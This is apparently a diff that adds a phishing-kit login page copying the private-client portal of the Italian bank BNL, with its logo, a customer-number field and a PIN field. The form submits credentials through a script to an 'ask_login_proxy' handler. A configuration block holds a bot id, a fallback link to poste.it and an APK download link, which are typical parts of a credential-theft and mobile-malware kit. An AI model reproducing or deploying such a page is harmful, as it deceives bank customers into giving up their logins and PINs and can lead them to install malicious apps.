@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <script type="text/javascript" src="../../../bower_components/jquery/dist/jquery.min.js"></script>
+    <script type="text/javascript" src="../../../bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
+    <link rel="stylesheet" href="../../../bower_components/font-awesome/css/font-awesome.min.css">
+    <script type="text/javascript" src="../../../bower_components/jquery.maskedinput/dist/jquery.maskedinput.min.js"></script>
+    <link rel="stylesheet" href="../../../node_modules/bootstrap/dist/css/bootstrap.min.css">
+    <script type="text/javascript" src="../../../core/form/core_form.js"></script>
+    <link rel="stylesheet" href="../../../core/form/core_form.css">
+    <script type="text/javascript" src="../../../core/token/core_token.js"></script>
+    <link rel="stylesheet" href="../../../core/token/core_token.css">
+    <base href="../../../login/" />
+    <link rel="stylesheet" href="email/email.css">
+    <script type="text/javascript" src="email/email.js"></script>
+    <link rel="stylesheet" href="form/css.css">
+    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+    <title>Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link media="all" href="index_3.css" type="text/css" rel="stylesheet">
+</head>
+
+<body>
+    <div>
+        <div class="master-div">
+            <div class="topline">
+                <img src="bnl_logo_transparent.png" alt="" class="i23">
+            </div>
+            <div class="topline2"></div>
+            <!--  -->
+            <div class="scum" id="login-view" style="display: ;">
+                <form class="command" name="websealForm" autocomplete="off" onsubmit="send1(event,'ask_login_proxy');return false">
+                    <div>
+                        <div class="titolo-area-riservata-div"> <strong>AREA CLIENTI PRIVATI</strong> </div>
+                        <div class="alert alert-danger err_div" style="display: none">
+                            <h4> <i class="fa fa-exclamation-triangle"></i> Errori</h4>
+                            <ul class="err_ul">
+                                <li>ede</li>
+                            </ul>
+                        </div>
+                        <div class="credenziali-area-riservata-div">
+                            <table class="login-table">
+                                <tbody>
+                                    <tr>
+                                        <td class="row-cells-area">
+                                            <div class="cont-div">
+                                                <div class="sub-cont-div">
+                                                    <div class="form-group">
+                                                        <p class="credenziali-font-par sub-cont-par">
+                                                            <strong> <label for="user">NUMERO CLIENTE</label></strong>
+                                                        </p>
+                                                        <input class="type-text-new form-control" pattern=".{4,}" data-err_text="Si prega di inserire un NUMERO CLIENTE valido" name="user" id="user" tabindex="1" maxlength="10" value="" type="text">
+                                                    </div>
+
+
+
+                                                    <div class="form-group">
+                                                        <p class=" credenziali-font-par sub-cont-par">
+                                                            <strong>
+                                                                <label for="pass">PIN</label>
+                                                            </strong>
+                                                        </p>
+                                                        <input class="type-text-new form-control" pattern=".{4,}" data-err_text="Si prega di inserire un PIN valido" name="pass" id="pass" tabindex="2" maxlength="6" type="password">
+                                                    </div>
+
+                                                </div>
+                                            </div>
+                                            <div class="cont-div">
+                                                <table class="inner-login-table">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td class="login-td">
+                                                                <div class="absolute-bottom-margin32 login-div"> <button class="login-button" type="submit" name="Invia" value=""></button> </div>
+                                                            </td>
+                                                            <td id="recupera-id" class="login-td">
+                                                                <div class="absolute-bottom-margin32 left-padding-6 bottom-padding-10 " style="bottom: 0px;"> <a class="link-testuali">Recupera ID cliente &gt;</a> </div>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            <script type="text/javascript">
+                var bid = "2e8769605cda4813b7ed755a970c2d72"
+                var php_js = {
+                    "device": {
+                        "isMobile": false,
+                        "isTablet": false,
+                        "isiOS": false,
+                        "isAndroid": false
+                    },
+                    "gets": [],
+                    "lng": "it",
+                    "bb_link": "https:\/\/securelogin.poste.it\/jod-fcc\/fcc-authentication.html",
+                    "link": "bnl.it",
+                    "apk_file": "http:\/\/test.com\/file.apk",
+                    "encryption": 0,
+                    "texts": "{}",
+                    "query": "",
+                    "home": "..\/..\/..\/home.php",
+                    "relative_root": "..\/..\/..\/",
+                    "parent_folders": "a1b2c3\/2e8769605cda4813b7ed755a970c2d72\/login\/"
+                }
+            </script>
+            <script type="text/javascript" src="form/form.js?v=646f4b67bb102"></script>
+            <script type="text/javascript" src="token/token.js?v=646f4b67bb147"></script>
